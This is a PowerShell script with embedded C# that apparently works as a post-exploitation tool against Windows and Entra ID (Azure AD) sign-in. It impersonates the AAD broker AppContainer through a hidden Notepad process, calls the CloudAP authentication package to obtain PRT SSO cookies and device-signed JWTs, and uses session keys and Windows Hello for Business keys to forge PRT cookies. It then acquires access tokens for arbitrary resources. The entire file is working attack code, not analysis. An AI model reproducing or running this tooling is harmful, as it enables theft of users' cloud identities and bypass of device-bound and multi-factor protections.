$AADTokenBrokerDefitions = @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

public class AADTokenBroker
{
    const string pbLabel = "AzureAD-SecureConversation";
    const int STARTF_USESHOWWINDOW = 0x00000001;
    const int SW_HIDE = 0x00000000;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const int PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES = 0x00020009;
    const uint TOKEN_DUPLICATE = 0x0002;
    const int SecurityImpersonation = 2;

    private static IntPtr hImpProc = IntPtr.Zero;
    private static IntPtr hImpToken = IntPtr.Zero;
    private static IntPtr hImpDupToken = IntPtr.Zero;

    private const int STATUS_SUCCESS = 0;
    private const int CALLPKG_GENERIC = 2;
    private static readonly Guid AadGlobalIdProviderGuid = new Guid(
        0xB16898C6, 0xA148, 0x4967, 0x91, 0x71, 0x64, 0xD7, 0x55, 0xDA, 0x85, 0x20
    );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_CAPABILITIES
    {
        public IntPtr AppContainerSid;
        public IntPtr Capabilities;
        public uint CapabilityCount;
        public uint Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct LSA_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CAP_PKG_INPUT
    {
        public uint ulMessageType;
        public Guid ProviderGuid;
        public uint ulInputSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public byte[] abInput;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NGC_IDP_ACCOUNT_INFO
    {
        public string idpDomain;
        public string tenantid;
        public IntPtr val3;
    };

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NGC_KEY_INFO
    {
        public IntPtr idpDomain;
        public string tenantid;
        public IntPtr userId;
        public IntPtr sid;
        public IntPtr keyName;
    };

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, ref SECURITY_CAPABILITIES securityCapabilities,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("KERNEL32.dll", SetLastError = true)]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll")]
    private extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("secur32.dll", SetLastError = true)]
    private static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    private static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    private static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthenticationPackage, IntPtr ProtocolSubmitBuffer, int SubmitBufferLength, out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);

    [DllImport("SECUR32.dll", SetLastError = true)]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [DllImport("kernel32.dll")]
    private static extern void RtlZeroMemory(IntPtr dst, UIntPtr length);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("cryptngc.dll")]
    private static extern int NgcImportSymmetricPopKey(ref NGC_IDP_ACCOUNT_INFO accountInfo, IntPtr arg2, IntPtr arg3, IntPtr sessionKey, uint cbSessionKey, out IntPtr pbKey, out uint cbKey);

    [DllImport("cryptngc.dll")]
    private static extern int NgcSignWithSymmetricPopKey(IntPtr pbKey, uint cbKey, string pbLabel, uint cbLabel, IntPtr pbContext, uint cbContext, string pbData, uint cbData, out IntPtr ppbOutput, out uint pcbOutput);

    [DllImport("cryptngc.dll")]
    private static extern int NgcDecryptWithSymmetricPopKey(IntPtr pbKey, uint cbKey, string pbLabel, uint cbLabel, IntPtr pbContext, uint cbContext, IntPtr pbIv, uint cbIv, IntPtr pbData, uint cbData, out IntPtr ppbOutput, out uint pcbOutput);

    [DllImport("cryptngc.dll")]
    private static extern int NgcEncryptWithSymmetricPopKey(IntPtr pbKey, uint cbKey, string pbLabel, uint cbLabel, IntPtr pbContext, uint cbContext, IntPtr pbIv, uint cbIv, string pbData, uint cbData, out IntPtr ppbOutput, out uint pcbOutput);

    [DllImport("cryptngc.dll")]
    private static extern int NgcGetUserIdKeyPublicKey(byte[] keyName, out IntPtr ppbOutput, out uint pcbOutput);

    [DllImport("cryptngc.dll")]
    private static extern int NgcSignWithUserIdKey(byte[] keyName, string pbData, uint cbData, uint Val, out IntPtr ppbOutput, out uint pcbOutput);

    [DllImport("cryptngc.dll", CharSet = CharSet.Unicode)]
    private static extern int NgcEnumUserIdKeys(string idpDomain, string tenantDomain, string userId, string userSid, out IntPtr pbOutput, out uint pcbOutput);

    private static bool Impersonate()
    {
        bool success = false;
        IntPtr appContainerSid;
        if (ConvertStringSidToSid("S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272", out appContainerSid))
        {
            var sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo = new STARTUPINFO();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            sInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
            sInfoEx.StartupInfo.wShowWindow = SW_HIDE;

            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

            if (InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize))
            {
                var securityCapablities = new SECURITY_CAPABILITIES();
                securityCapablities.AppContainerSid = appContainerSid;

                if (UpdateProcThreadAttribute(
                    sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
                    ref securityCapablities, (IntPtr)Marshal.SizeOf(securityCapablities), IntPtr.Zero, IntPtr.Zero))
                {
                    var pInfo = new PROCESS_INFORMATION();
                    var pSec = new SECURITY_ATTRIBUTES();
                    var tSec = new SECURITY_ATTRIBUTES();
                    pSec.nLength = Marshal.SizeOf(pSec);
                    tSec.nLength = Marshal.SizeOf(tSec);

                    if (CreateProcess("C:\\Windows\\system32\\Notepad.exe", "", ref pSec, ref tSec,
                        false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, "C:\\", ref sInfoEx, out pInfo))
                    {
                        hImpProc = pInfo.hProcess;
                        if (OpenProcessToken(hImpProc, TOKEN_DUPLICATE, out hImpToken))
                        {
                            if (DuplicateToken(hImpToken, SecurityImpersonation, ref hImpDupToken))
                            {
                                success = ImpersonateLoggedOnUser(hImpDupToken);
                            }
                        }
                    }
                }
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
            }
        }
        return success;
    }

    private static void Revert()
    {
        RevertToSelf();

        if (hImpDupToken != IntPtr.Zero)
        {
            CloseHandle(hImpDupToken);
        }

        if (hImpToken != IntPtr.Zero)
        {
            CloseHandle(hImpToken);
        }

        if (hImpProc != IntPtr.Zero)
        {
            TerminateProcess(hImpProc, 0);
        }
        return;
    }

    private static IntPtr GetLsaHandle()
    {
        IntPtr hLsa;
        int status = LsaConnectUntrusted(out hLsa);
        if (status != STATUS_SUCCESS)
        {
            return IntPtr.Zero;
        }
        return hLsa;
    }

    private static uint GetCloudApPackageId(IntPtr hLsa)
    {
        string szCloudAPName = "CloudAP";
        LSA_STRING cloudApPackageName = new LSA_STRING
        {
            Length = (ushort)(szCloudAPName.Length),
            MaximumLength = (ushort)((szCloudAPName.Length + 1)),
            Buffer = Marshal.StringToHGlobalAnsi(szCloudAPName)
        };

        uint cloudApPackageId;
        int status = LsaLookupAuthenticationPackage(hLsa, ref cloudApPackageName, out cloudApPackageId);
        Marshal.FreeHGlobal(cloudApPackageName.Buffer);
        if (status != STATUS_SUCCESS)
        {
            return 0;
        }
        return cloudApPackageId;
    }

    private static string CallCloudAP(IntPtr hLsa, uint cloudApPackageId, string payload)
    {
        CAP_PKG_INPUT capPkgInput = new CAP_PKG_INPUT();
        capPkgInput.ulMessageType = CALLPKG_GENERIC;
        capPkgInput.ProviderGuid = AadGlobalIdProviderGuid;
        capPkgInput.ulInputSize = (uint)payload.Length;

        IntPtr capPkgInputPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(CAP_PKG_INPUT)));
        Marshal.StructureToPtr(capPkgInput, capPkgInputPtr, false);

        byte[] capPkgInputBytes = new byte[Marshal.SizeOf(typeof(CAP_PKG_INPUT))];
        Marshal.Copy(capPkgInputPtr, capPkgInputBytes, 0, Marshal.SizeOf(typeof(CAP_PKG_INPUT)));
        Marshal.FreeHGlobal(capPkgInputPtr);

        int cbCloudApRequest = Marshal.SizeOf(typeof(CAP_PKG_INPUT)) + 1 + payload.Length;
        IntPtr cloudApRequestBuf = Marshal.AllocHGlobal(cbCloudApRequest);
        RtlZeroMemory(cloudApRequestBuf, (UIntPtr)cbCloudApRequest);
        Marshal.Copy(capPkgInputBytes, 0, cloudApRequestBuf, Marshal.SizeOf(typeof(CAP_PKG_INPUT)));

        byte[] requestJsonBuffer = System.Text.Encoding.ASCII.GetBytes(payload);
        Marshal.Copy(requestJsonBuffer, 0, cloudApRequestBuf + 4 + 16 + 4, payload.Length);

        int cbCloudApResponse;
        IntPtr pResponseBuffer;
        int subStatus;
        int status = LsaCallAuthenticationPackage(
            hLsa,
            cloudApPackageId,
            cloudApRequestBuf,
            cbCloudApRequest,
            out pResponseBuffer,
            out cbCloudApResponse,
            out subStatus
        );
        Marshal.FreeHGlobal(cloudApRequestBuf);

        string response = "";
        if (status == STATUS_SUCCESS)
        {
            if (pResponseBuffer != IntPtr.Zero)
            {
                byte[] cloudApResponseBytes = new byte[cbCloudApResponse];
                Marshal.Copy(pResponseBuffer, cloudApResponseBytes, 0, cbCloudApResponse);
                LsaFreeReturnBuffer(pResponseBuffer);
                response = Encoding.UTF8.GetString(cloudApResponseBytes, 0, cloudApResponseBytes.Length);
            }
        }
        return response;
    }
    private static string SendToCloudAp(string payload)
    {
        string response = "";
        IntPtr hLsa = GetLsaHandle();
        if (hLsa != IntPtr.Zero)
        {
            uint cloudApPackageId = GetCloudApPackageId(hLsa);
            if (cloudApPackageId != 0 && Impersonate())
            {
                response = CallCloudAP(hLsa, cloudApPackageId, payload);
                Revert();
            }
        }
        return response;
    }

    private static string Base64UrlEncode(byte[] input)
    {
        string base64String = Convert.ToBase64String(input);
        return base64String.Replace('+', '-').Replace('/', '_').Replace("=", "");
    }

    private static byte[] Base64UrlDecode(string input)
    {
        input = input.Replace('-', '+').Replace('_', '/');
        switch (input.Length % 4)
        {
            case 2: input += "=="; break;
            case 3: input += "="; break;
        }
        return Convert.FromBase64String(input);
    }

    private static bool ImportSessionkey(string tenantid, IntPtr sessionKey, int cbSessionKey, out IntPtr pbKey, out uint cbKey)
    {
        var accountInfo = new NGC_IDP_ACCOUNT_INFO();
        accountInfo.idpDomain = "login.windows.net";
        accountInfo.tenantid = tenantid;
        accountInfo.val3 = (IntPtr)0;

        var status = NgcImportSymmetricPopKey(ref accountInfo, (IntPtr)0, (IntPtr)2, sessionKey, (uint)cbSessionKey, out pbKey, out cbKey);
        if (status != 0)
        {
            return false;
        }
        return true;
    }

    public static string RequestSSOCookie(string nonce)
    {
        string payload = string.Format("{{\"call\": 2, \"payload\":\"https:\\/\\/login.microsoftonline.com\\/common\\/oatuh2\\/authorize?sso_nonce={0}\", \"correlationId\":\"\"}}", nonce);
        return SendToCloudAp(payload);
    }

    public static string SignPayload(string payload)
    {
        string buffer = string.Format("{{\"payload\": \"{0}\", \"call\": 1 }}", payload.Replace("\"", "\\\""));
        string escaped = buffer.Replace("\n", "").Replace("\r", "");
        return SendToCloudAp(escaped);
    }

    public static string CreateJWS(string tenantid, string sessionKeyJwe, string payload)
    {
        var sessionKey = Base64UrlDecode(sessionKeyJwe.Split('.')[1]);
        IntPtr sessionKeyPtr = Marshal.AllocHGlobal(sessionKey.Length);
        Marshal.Copy(sessionKey, 0, sessionKeyPtr, sessionKey.Length);

        IntPtr pbKey;
        uint cbKey;
        bool ret = ImportSessionkey(tenantid, sessionKeyPtr, sessionKey.Length, out pbKey, out cbKey);
        Marshal.FreeHGlobal(sessionKeyPtr);
        if (ret)
        {
            byte[] ctxBytes = new byte[24];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(ctxBytes);
            }

            string header = String.Format(
                "{{" +
                    "\"alg\":\"HS256\"," +
                    "\"kdf_ver\":2," +
                    "\"ctx\":\"{0}\"" +
                "}}", Convert.ToBase64String(ctxBytes)
            );

            string jwtHeaderPayload = Base64UrlEncode(Encoding.UTF8.GetBytes(header)) + "." + Base64UrlEncode(Encoding.UTF8.GetBytes(payload));

            SHA256 sha256 = SHA256.Create();
            sha256.TransformBlock(ctxBytes, 0, ctxBytes.Length, ctxBytes, 0);
            byte[] payloadBytes = Encoding.UTF8.GetBytes(payload);
            sha256.TransformFinalBlock(payloadBytes, 0, payloadBytes.Length);

            byte[] kdfCtxBytes = sha256.Hash;
            IntPtr kdfCtx = Marshal.AllocHGlobal(kdfCtxBytes.Length);
            Marshal.Copy(kdfCtxBytes, 0, kdfCtx, kdfCtxBytes.Length);

            IntPtr pbOut;
            uint cbOutLen;
            var status = NgcSignWithSymmetricPopKey(pbKey, cbKey, pbLabel, (uint)pbLabel.Length, kdfCtx, 32, jwtHeaderPayload, (uint)jwtHeaderPayload.Length, out pbOut, out cbOutLen);
            Marshal.FreeHGlobal(kdfCtx);

            if (status == 0)
            {
                byte[] pbOutBytes = new byte[cbOutLen];
                Marshal.Copy(pbOut, pbOutBytes, 0, pbOutBytes.Length);
                return jwtHeaderPayload + "." + Base64UrlEncode(pbOutBytes);
            }
        }
        return "";
    }

    public static byte[] EncryptWithSessionkey(string tenantid, string sessionKeyB64, string ctxB64, string ivB64, string text)
    {
        var sessionKey = Base64UrlDecode(sessionKeyB64);
        IntPtr sessionKeyPtr = Marshal.AllocHGlobal(sessionKey.Length);
        Marshal.Copy(sessionKey, 0, sessionKeyPtr, sessionKey.Length);

        IntPtr pbKey;
        uint cbKey;
        bool ret = ImportSessionkey(tenantid, sessionKeyPtr, sessionKey.Length, out pbKey, out cbKey);
        Marshal.FreeHGlobal(sessionKeyPtr);
        if (ret)
        {
            var ctx = Base64UrlDecode(ctxB64);
            IntPtr ctxPtr = Marshal.AllocHGlobal(ctx.Length);
            Marshal.Copy(ctx, 0, ctxPtr, ctx.Length);

            var iv = Base64UrlDecode(ivB64);
            IntPtr ivPtr = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, ivPtr, iv.Length);

            IntPtr pbOut;
            uint cbOutLen;
            var status = NgcEncryptWithSymmetricPopKey(
                pbKey, cbKey,
                pbLabel, (uint)pbLabel.Length,
                ctxPtr, (uint)ctx.Length,
                ivPtr, (uint)iv.Length,
                text, (uint)text.Length,
                out pbOut, out cbOutLen
            );
            Marshal.FreeHGlobal(ctxPtr);
            Marshal.FreeHGlobal(ivPtr);
            if (status == 0)
            {
                byte[] pbOutBytes = new byte[cbOutLen];
                Marshal.Copy(pbOut, pbOutBytes, 0, pbOutBytes.Length);
                return pbOutBytes;
            }
        }
        return null;
    }

    public static string DecryptWithSessionkey(string tenantid, string sessionKeyB64, string ctxB64, string ivB64, string cipherTextB64)
    {
        var sessionKey = Base64UrlDecode(sessionKeyB64);
        IntPtr sessionKeyPtr = Marshal.AllocHGlobal(sessionKey.Length);
        Marshal.Copy(sessionKey, 0, sessionKeyPtr, sessionKey.Length);

        IntPtr pbKey;
        uint cbKey;
        bool ret = ImportSessionkey(tenantid, sessionKeyPtr, sessionKey.Length, out pbKey, out cbKey);
        Marshal.FreeHGlobal(sessionKeyPtr);
        if (ret)
        {
            var ctx = Base64UrlDecode(ctxB64);
            IntPtr ctxPtr = Marshal.AllocHGlobal(ctx.Length);
            Marshal.Copy(ctx, 0, ctxPtr, ctx.Length);

            var iv = Base64UrlDecode(ivB64);
            IntPtr ivPtr = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, ivPtr, iv.Length);

            var cipherText = Base64UrlDecode(cipherTextB64);
            IntPtr cipherTextPtr = Marshal.AllocHGlobal(cipherText.Length);
            Marshal.Copy(cipherText, 0, cipherTextPtr, cipherText.Length);

            IntPtr pbOut;
            uint cbOutLen;
            var status = NgcDecryptWithSymmetricPopKey(
                pbKey, cbKey,
                pbLabel, (uint)pbLabel.Length,
                ctxPtr, (uint)ctx.Length,
                ivPtr, (uint)iv.Length,
                cipherTextPtr, (uint)cipherText.Length,
                out pbOut, out cbOutLen
            );
            Marshal.FreeHGlobal(ctxPtr);
            Marshal.FreeHGlobal(ivPtr);
            Marshal.FreeHGlobal(cipherTextPtr);

            if (status == 0)
            {
                return Marshal.PtrToStringAnsi(pbOut, (int)cbOutLen);
            }
        }
        return "";
    }

    public static string CreateWhfbAssertion(string keyNameStr, string payloadStr)
    {
        UnicodeEncoding Unicode = new UnicodeEncoding();
        int byteCount = Unicode.GetByteCount(keyNameStr.ToCharArray(), 0, keyNameStr.Length);
        Byte[] keyName = new Byte[byteCount];
        Unicode.GetBytes(keyNameStr, 0, keyNameStr.Length, keyName, 0);

        IntPtr pbOut;
        uint cbOutLen;
        var status = NgcGetUserIdKeyPublicKey(keyName, out pbOut, out cbOutLen);
        if (status == 0)
        {
            byte[] certBytes = new byte[cbOutLen];
            Marshal.Copy(pbOut, certBytes, 0, certBytes.Length);

            SHA256 sha256 = SHA256.Create();
            byte[] hashBytes = sha256.ComputeHash(certBytes);

            string header = String.Format(
                "{{" +
                    "\"alg\":\"RS256\"," +
                    "\"typ\":\"JWT\"," +
                    "\"kid\":\"{0}\"," +
                    "\"use\":\"ngc\"" +
                "}}", System.Convert.ToBase64String(hashBytes));
            string jwtHeaderPayload = Base64UrlEncode(Encoding.UTF8.GetBytes(header)) + "." + Base64UrlEncode(Encoding.UTF8.GetBytes(payloadStr));

            status = NgcSignWithUserIdKey(keyName, jwtHeaderPayload, (uint)jwtHeaderPayload.Length, 1, out pbOut, out cbOutLen);
            if (status == 0)
            {
                byte[] pbOutBytes = new byte[cbOutLen];
                Marshal.Copy(pbOut, pbOutBytes, 0, pbOutBytes.Length);
                return jwtHeaderPayload + "." + Base64UrlEncode(pbOutBytes);
            }
        }
        return "";
    }

    public static string GetWhfbKeyName(string tenantid, string userId)
    {
        IntPtr pbOut;
        uint cbOutLen;
        string idpDomain = "login.windows.net";
        string sid = WindowsIdentity.GetCurrent().User.ToString();
        var status = NgcEnumUserIdKeys(idpDomain, tenantid, userId, sid, out pbOut, out cbOutLen);
        if (status >= 0)
        {
            NGC_KEY_INFO keyInfo = (NGC_KEY_INFO)Marshal.PtrToStructure(pbOut, typeof(NGC_KEY_INFO));
            return Marshal.PtrToStringUni(keyInfo.keyName);
        }
        return "";
    }
}
"@

function Base64Decode($Encoded)
{
    $Length = $Encoded.Length
    $RandomChar = 1..($Length - 3) | Get-Random
    $Encoded = $Encoded.Insert($RandomChar,'=')    
    $Stripped = $Encoded.Replace('=','')  
    $ModulusValue = ($Stripped.length % 4)   
        Switch ($ModulusValue) {
            '0' {$Padded = $Stripped}
            '1' {$Padded = $Stripped.Substring(0,$Stripped.Length - 1)}
            '2' {$Padded = $Stripped + ('=' * (4 - $ModulusValue))}
            '3' {$Padded = $Stripped + ('=' * (4 - $ModulusValue))}
        }
    
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Padded))
}

function Get-Nonce ()
{
    $url = "https://login.microsoftonline.com/common/oauth2/token"
    $body = @{
        grant_type = "srv_challenge"
    }
    $response = Invoke-RestMethod -Uri $url -Method Post -Body $body
    return $response.Nonce
}

function Get-TenantId ($Username) 
{
    $domain = $Username.Split('@')[1]
    $url = "https://login.microsoftonline.com/$domain/.well-known/openid-configuration"    
    $response = Invoke-RestMethod -Uri $url -Method Get
    $tenantid = $response.token_endpoint.Split('/')[3]
    return $tenantid
}

function Get-WhfbKeyName ($Username) 
{
    Add-Type -TypeDefinition $AADTokenBrokerDefitions
    $tenantid = Get-TenantId($Username)
    $returnBuffer = [AADTokenBroker]::GetWhfbKeyName($tenantid, $Username)
    return $returnBuffer
}

function Get-WhfbAssertion ($Keyname, $Tenantid, $Username, $Nonce) 
{
    Add-Type -TypeDefinition $AADTokenBrokerDefitions
    $time = [Math]::Truncate((Get-Date -UFormat "%s"))
    $payload = @{
        "scope" = "openid aza ugs"
        "aud" = $Tenantid.ToUpper()
        "iss" = $Username
        "iat" = $time - 36000
        "exp" = $time + 36000
        "request_nonce" = $Nonce
    }
    $payloadStr = $payload | ConvertTo-Json
    $assertion = [AADTokenBroker]::CreateWhfbAssertion($Keyname, $payloadStr)
    return $assertion
}

function Request-PRTCookie () 
{
    [cmdletbinding()]
    Param (
    ) Process 
    {
        Add-Type -TypeDefinition $AADTokenBrokerDefitions
        $nonce = Get-Nonce  
        $returnBuffer = [AADTokenBroker]::RequestSSOCookie($nonce)
        return ($returnBuffer | ConvertFrom-Json).assertion
    }
}

function Create-PRTCookie() 
{
    [cmdletbinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Username,        
        [Parameter(Mandatory=$False)]
        [string]$Password,
        [Parameter(Mandatory=$False)]
        [bool]$Whfb
    ) Process 
    {
        Add-Type -TypeDefinition $AADTokenBrokerDefitions

        $nonce = Get-Nonce
        $Tenantid = Get-TenantId -Username $Username
        $payload = @{
            "client_id" = "29d9ed98-a469-4536-ade2-f981bc1d605e"
            "request_nonce" = $nonce
            "scope" = "openid aza ugs"
            "win_ver" = "10.0.19041.3996"
            "grant_type" = "urn:ietf:params:oauth:grant-type:jwt-bearer"
            "username" = $Username
        }

        if ($Whfb)
        {
            $Keyname = Get-WhfbKeyName -Username $Username
            $assertion = Get-WhfbAssertion -Keyname $Keyname -Tenantid $Tenantid -Username $Username -Nonce $nonce
            $payload["assertion"] = $assertion
            $payload["grant_type"] = "urn:ietf:params:oauth:grant-type:jwt-bearer"                
        } 
        else
        {
            $payload["password"] = $Password
            $payload["grant_type"] = "password"
        }

        $payloadStr = $payload | ConvertTo-Json        
        $returnBuffer = [AADTokenBroker]::SignPayload($payloadStr)
        $signedjwt = ($returnBuffer | ConvertFrom-Json).assertion

        $body = @{
            grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
            request = $signedjwt
        }

        $url = "https://login.microsoftonline.com/common/oauth2/token"
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body

        $payload = @{
            "refresh_token" = $response.refresh_token
            "is_primary" = "true"
            "win_ver" = "10.0.19041.3570"
            "x_client_platform" = "windows"
            "request_nonce" = $nonce
        }
        $payloadStr = $payload | ConvertTo-Json
        $prtCookie = [AADTokenBroker]::CreateJWS($tenantid, $response.session_key_jwe, $payloadStr)
        return $prtCookie
    }
}

function Acquire-Token() 
{
    [cmdletbinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Username,        
        [Parameter(Mandatory=$False)]
        [string]$Password,
        [Parameter(Mandatory=$False)]
        [bool]$Whfb,
        [Parameter(Mandatory=$True)]
        [string]$Resource,
        [Parameter(Mandatory=$True)]
        [string]$Clientid,
        [Parameter(Mandatory=$False)]
        [bool]$PRTFlow
    ) Process 
    {
        Add-Type -TypeDefinition $AADTokenBrokerDefitions

        $nonce = Get-Nonce
        $Tenantid = Get-TenantId -Username $Username
        $payload = @{
            "tenantid" = $Tenantid
            "client_id" = $Clientid
            "win_ver" = "10.0.19041.3570"
            "username" = $Username
            "request_nonce" = $nonce
            "scope" = "openid aza ugs .default"
        }
        
        if ($PRTFlow -eq $False)
        {   
            $payload["scope"] = "openid"
            $payload["resource"] = $Resource
        }

        if ($Whfb)
        {
            $Keyname = Get-WhfbKeyName -Username $Username
            $assertion = Get-WhfbAssertion -Keyname $Keyname -Tenantid $Tenantid -Username $Username -Nonce $nonce
            $payload["assertion"] = $assertion
            $payload["grant_type"] = "urn:ietf:params:oauth:grant-type:jwt-bearer"                
        } 
        else
        {
            $payload["password"] = $Password
            $payload["grant_type"] = "password"
        }

        $payloadStr = $payload | ConvertTo-Json
        $returnBuffer = [AADTokenBroker]::SignPayload($payloadStr)
        $signedjwt = ($returnBuffer | ConvertFrom-Json).assertion

        $body = @{
            grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
            request = $signedjwt
        }

        $url = "https://login.microsoftonline.com/common/oauth2/token"
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body

        if ($PRTFlow)
        {
            $sessionKeyJwe = $response.session_key_jwe
            $payload = @{
                "refresh_token" = $response.refresh_token
                "scope" = "openid"
                "resource" = $Resource
                "is_primary" = "true"
                "win_ver" = "10.0.19041.3570"
                "x_client_platform" = "windows"
                "request_nonce" = $nonce
                "grant_type" = "refresh_token"
                "client_id" = $Clientid
                "aud" = "login.microsoftonline.com"
                "iss" = "aad:brokerplugin"
            }
            $payloadStr = $payload | ConvertTo-Json
            $signedjwt = [AADTokenBroker]::CreateJWS($tenantid, $sessionKeyJwe, $payloadStr)
    
            $body = @{
                grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
                request = $signedjwt
                client_info = "1"
                windows_api_version= "2.0.1"
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $body
            
            $headerJwt = $response.Split('.')[0]
            $headerJson = Base64Decode($headerJwt)
            $ctx = (ConvertFrom-Json $headerJson).ctx
            $iv = $response.Split('.')[2]
            $cipherText = $response.Split('.')[3]
    
            $text = [AADTokenBroker]::DecryptWithSessionkey($tenantid, $sessionKeyJwe.Split('.')[1], $ctx, $iv, $cipherText)
            return (ConvertFrom-Json $text)    
        } 
        else 
        {
            return $response
        }
   }
}
